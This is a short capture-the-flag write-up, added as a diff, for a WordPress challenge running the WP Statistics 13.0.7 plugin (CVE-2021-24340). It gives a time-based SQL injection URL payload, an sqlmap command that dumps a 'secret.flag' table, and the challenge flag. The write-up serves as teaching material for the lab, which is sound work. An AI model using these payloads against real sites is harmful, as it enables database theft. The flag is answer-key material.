@@ -1,0 +1,11 @@
+The wordpress site hosted on port 8080 has a plugin installed (WP Statistics version 13.0.7) vulnerable to time-based SQL injection (Hopefully CTFd.io network will stay stable).
+
+CVE-2021-24340 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24340)
+
+PoC: http://localhost:8080/wp-admin/admin.php?page=wps_pages_page&ID=0+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))SQLi)&type=home
+*from https://wpscan.com/vulnerability/d2970cfb-0aa9-4516-9a4b-32971f41a19c*
+
+The flag can be retrived using a time-based SQLi using the following SQLMap command:
+sqlmap "http://localhost:8080/wp-admin/admin.php?page=wps_pages_page&ID=0*&type=home" --dbms=MariaDB --dump -D secret -T flag --batch
+
+flag: uoft{0lD_Plu91NS_4r3_n0_900d}
